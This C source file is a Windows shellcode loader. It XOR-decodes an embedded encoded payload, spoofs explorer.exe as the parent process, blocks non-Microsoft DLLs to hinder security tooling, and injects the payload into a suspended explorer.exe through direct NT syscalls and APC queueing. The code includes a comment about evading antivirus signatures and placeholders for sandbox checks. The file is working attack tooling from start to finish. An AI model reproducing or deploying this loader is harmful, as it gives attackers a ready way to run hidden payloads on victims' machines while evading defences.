#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <stdint.h>
#include <psapi.h>
#include <winternl.h>
#include <tlhelp32.h>
#include "Syscalls.h"

//unsigned char payload[] = {};
unsigned char payload[] = {0x9d,0x29,0xe2,0x85,0x91,0x89,0xad,0x61,0x61,0x61,0x20,0x30,0x20,0x31,0x33,0x29,0x50,0xb3,0x30,0x37,0x04,0x29,0xea,0x33,0x01,0x29,0xea,0x33,0x79,0x29,0xea,0x33,0x41,0x29,0xea,0x13,0x31,0x29,0x6e,0xd6,0x2b,0x2b,0x2c,0x50,0xa8,0x29,0x50,0xa1,0xcd,0x5d,0x00,0x1d,0x63,0x4d,0x41,0x20,0xa0,0xa8,0x6c,0x20,0x60,0xa0,0x83,0x8c,0x33,0x20,0x30,0x29,0xea,0x33,0x41,0xea,0x23,0x5d,0x29,0x60,0xb1,0x07,0xe0,0x19,0x79,0x6a,0x63,0x6e,0xe4,0x13,0x61,0x61,0x61,0xea,0xe1,0xe9,0x61,0x61,0x61,0x29,0xe4,0xa1,0x15,0x06,0x29,0x60,0xb1,0x31,0xea,0x29,0x79,0x25,0xea,0x21,0x41,0x28,0x60,0xb1,0x82,0x37,0x29,0x9e,0xa8,0x20,0xea,0x55,0xe9,0x2c,0x50,0xa8,0x29,0x60,0xb7,0x29,0x50,0xa1,0x20,0xa0,0xa8,0x6c,0xcd,0x20,0x60,0xa0,0x59,0x81,0x14,0x90,0x2d,0x62,0x2d,0x45,0x69,0x24,0x58,0xb0,0x14,0xb9,0x39,0x25,0xea,0x21,0x45,0x28,0x60,0xb1,0x07,0x20,0xea,0x6d,0x29,0x25,0xea,0x21,0x7d,0x28,0x60,0xb1,0x20,0xea,0x65,0xe9,0x20,0x39,0x29,0x60,0xb1,0x20,0x39,0x3f,0x38,0x3b,0x20,0x39,0x20,0x38,0x20,0x3b,0x29,0xe2,0x8d,0x41,0x20,0x33,0x9e,0x81,0x39,0x20,0x38,0x3b,0x29,0xea,0x73,0x88,0x2a,0x9e,0x9e,0x9e,0x3c,0x29,0x50,0xba,0x32,0x28,0xdf,0x16,0x08,0x0f,0x08,0x0f,0x04,0x15,0x61,0x20,0x37,0x29,0xe8,0x80,0x28,0xa6,0xa3,0x2d,0x16,0x47,0x66,0x9e,0xb4,0x32,0x32,0x29,0xe8,0x80,0x32,0x3b,0x2c,0x50,0xa1,0x2c,0x50,0xa8,0x32,0x32,0x28,0xdb,0x5b,0x37,0x18,0xc6,0x61,0x61,0x61,0x61,0x9e,0xb4,0x89,0x6f,0x61,0x61,0x61,0x50,0x58,0x53,0x4f,0x50,0x57,0x59,0x4f,0x54,0x57,0x4f,0x59,0x59,0x61,0x3b,0x29,0xe8,0xa0,0x28,0xa6,0xa1,0xda,0x60,0x61,0x61,0x2c,0x50,0xa8,0x32,0x32,0x0b,0x62,0x32,0x28,0xdb,0x36,0xe8,0xfe,0xa7,0x61,0x61,0x61,0x61,0x9e,0xb4,0x89,0x15,0x61,0x61,0x61,0x4e,0x20,0x00,0x04,0x38,0x27,0x06,0x2d,0x29,0x58,0x52,0x19,0x33,0x03,0x27,0x23,0x14,0x2c,0x53,0x28,0x11,0x59,0x06,0x55,0x07,0x29,0x0d,0x15,0x33,0x51,0x2d,0x54,0x3e,0x58,0x16,0x14,0x36,0x51,0x2b,0x0e,0x2f,0x59,0x59,0x03,0x29,0x50,0x06,0x23,0x58,0x14,0x30,0x04,0x20,0x54,0x31,0x1b,0x0d,0x3e,0x14,0x13,0x07,0x56,0x33,0x04,0x0c,0x08,0x52,0x2e,0x52,0x0a,0x52,0x08,0x14,0x0b,0x17,0x17,0x34,0x33,0x35,0x24,0x23,0x58,0x36,0x55,0x4c,0x11,0x0c,0x24,0x33,0x19,0x1b,0x0c,0x38,0x02,0x16,0x50,0x33,0x0f,0x32,0x4c,0x18,0x20,0x35,0x08,0x57,0x29,0x27,0x2b,0x09,0x4c,0x19,0x58,0x24,0x2c,0x57,0x61,0x29,0xe8,0xa0,0x32,0x3b,0x20,0x39,0x2c,0x50,0xa8,0x32,0x29,0xd9,0x61,0x53,0xc9,0xe5,0x61,0x61,0x61,0x61,0x31,0x32,0x32,0x28,0xa6,0xa3,0x8a,0x34,0x4f,0x5a,0x9e,0xb4,0x29,0xe8,0xa7,0x0b,0x6b,0x3e,0x29,0xe8,0x90,0x0b,0x7e,0x3b,0x33,0x09,0xe1,0x52,0x61,0x61,0x28,0xe8,0x81,0x0b,0x65,0x20,0x38,0x28,0xdb,0x14,0x27,0xff,0xe7,0x61,0x61,0x61,0x61,0x9e,0xb4,0x2c,0x50,0xa1,0x32,0x3b,0x29,0xe8,0x90,0x2c,0x50,0xa8,0x2c,0x50,0xa8,0x32,0x32,0x28,0xa6,0xa3,0x4c,0x67,0x79,0x1a,0x9e,0xb4,0xe4,0xa1,0x14,0x7e,0x29,0xa6,0xa0,0xe9,0x72,0x61,0x61,0x28,0xdb,0x25,0x91,0x54,0x81,0x61,0x61,0x61,0x61,0x9e,0xb4,0x29,0x9e,0xae,0x15,0x63,0x8a,0xcb,0x89,0x34,0x61,0x61,0x61,0x32,0x38,0x0b,0x21,0x3b,0x28,0xe8,0xb0,0xa0,0x83,0x71,0x28,0xa6,0xa1,0x61,0x71,0x61,0x61,0x28,0xdb,0x39,0xc5,0x32,0x84,0x61,0x61,0x61,0x61,0x9e,0xb4,0x29,0xf2,0x32,0x32,0x29,0xe8,0x86,0x29,0xe8,0x90,0x29,0xe8,0xbb,0x28,0xa6,0xa1,0x61,0x41,0x61,0x61,0x28,0xe8,0x98,0x28,0xdb,0x73,0xf7,0xe8,0x83,0x61,0x61,0x61,0x61,0x9e,0xb4,0x29,0xe2,0xa5,0x41,0xe4,0xa1,0x15,0xd3,0x07,0xea,0x66,0x29,0x60,0xa2,0xe4,0xa1,0x14,0xb3,0x39,0xa2,0x39,0x0b,0x61,0x38,0x28,0xa6,0xa3,0x91,0xd4,0xc3,0x37,0x9e,0xb4};
unsigned int payload_len = sizeof(payload);

unsigned char* decoded;

#define PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY 0x20007
#define PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON 0x100000000000

// REPLACE_SANDBOX_CHECK

int deC(unsigned char payload[])
{
    char *key = "abcdefghi";
    int key_len = strlen(key);
    for (int i = 0; i < payload_len; i++)
    {
        char d = payload[i];
        for (int z = 0; z < key_len; z++)
        {
            d = d ^ (int)key[z];
        }
        decoded[i] = d;
    }
    return 0;
}

HANDLE GetParentHandle(LPCSTR parent)
{
    HANDLE hProcess = NULL;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, parent) == 0)
            {
                CLIENT_ID cID;
                cID.UniqueThread = 0;
                cID.UniqueProcess = UlongToHandle(entry.th32ProcessID);

                OBJECT_ATTRIBUTES oa;
                InitializeObjectAttributes(&oa, 0, 0, 0, 0);

                NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cID);

                if (hProcess != NULL && hProcess != INVALID_HANDLE_VALUE)
                {
                    NtClose(snapshot);
                    return hProcess;
                }
                else
                {
                    NtClose(snapshot);
                    return INVALID_HANDLE_VALUE;
                }
            }
        }
    }
    NtClose(snapshot);
    return INVALID_HANDLE_VALUE;
}

PROCESS_INFORMATION SpawnProc(LPSTR process, HANDLE hParent) {
    STARTUPINFOEXA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    SIZE_T attributeSize;

    InitializeProcThreadAttributeList(NULL, 2, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &attributeSize);
    
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(DWORD64), NULL, NULL);
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);
    
    si.StartupInfo.cb = sizeof(si);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

    if (!CreateProcessA(NULL, process, NULL, NULL, TRUE, CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
    }

    DeleteProcThreadAttributeList(si.lpAttributeList);
    return pi;
}

int main()
{
    DWORD oldprotect = 0;
    PVOID base_addr = NULL;
    SIZE_T bytesWritten;

//    REPLACE_ME_SANDBOX_CALL
    decoded = (unsigned char*)malloc(payload_len);
    deC(payload);

    //next few lines do nothing... but they help evade some AV signatures
    NTSTATUS res = -1;
    if (res == 0) {
        printf("Doing nothing!");
    }

    HANDLE hParent = GetParentHandle("explorer.exe");
    if (hParent == INVALID_HANDLE_VALUE)
        return 0;

    PROCESS_INFORMATION pi = SpawnProc((LPSTR)"explorer.exe", hParent);
    if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
        return 0;
    
    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;

    res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, (PSIZE_T)&payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (res != 0){
        printf(  "NtAllocateVirtualMemory FAILED to allocate memory in created process, exiting: \n",  res );
        return 0;
    }
    else {
        printf(  "NtAllocateVirtualMemory allocated memory in the created process sucessfully.\n");
    }

    res = NtWriteVirtualMemory(hProcess, base_addr, decoded, payload_len, &bytesWritten);

    if (res != 0){
        printf(  "NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: \n",  res );
        return 0;
    }
    else{
        printf(  "NtWriteVirtualMemory wrote decoded payload to allocated memory successfully.\n");
    }

    res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);

    if (res != 0){
        printf(  "NtProtectVirtualMemory FAILED to modify permissions: \n",  res );
        return 0;
    }
    else{
        printf(  "NtProtectVirtualMemory modified permissions successfully.\n");
    }

    res = NtQueueApcThread(hThread, base_addr, NULL, NULL, NULL);

    if (res != 0){
        printf(  "NtQueueApcThread FAILED to add routine to APC queue: \n",  res );
        return 0;
    }
    else{
        printf(  "NtQueueApcThread added routine to APC queue successfully.\n");
    }

    res = NtAlertResumeThread(hThread, NULL);

    if (res != 0){
        printf(  "NtAlertResumeThread FAILED to resume thread: \n",  res );
        return 0;
    }
    else{
        printf(  "NtAlertResumeThread resumed thread successfully.\n");
    }

    NtClose(hProcess);
    NtClose(hThread);
}
